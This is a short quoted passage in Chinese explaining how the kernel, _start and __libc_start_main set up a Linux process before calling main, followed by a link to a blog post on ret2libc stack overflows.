> 内核加载可执行文件，并且建立正文段，数据段，bss段和堆栈段，特别的，内核为参数和环境变量分配页面，并且将所有必要信息push到堆栈上。
> 控制流程到了_start上面。_start从内核建立的堆栈上获取所有信息，为__libc_start_main建立参数栈，并且调用__libc_start_main。
> __libc_start_main初始化一些必要的东西，特别是C library（比如malloc)线程环境并且调用我们的main函数。
> 我们的main会以main(argv,argv)来被调用。事实上，这里有意思的一点是main函数的签名。__libc_start_main认为main的签名为main(int, char , char )，如果你感到好奇，尝试执行下面的程序。
https://www.mi1k7ea.com/2019/03/05/%E6%A0%88%E6%BA%A2%E5%87%BA%E4%B9%8Bret2libc/
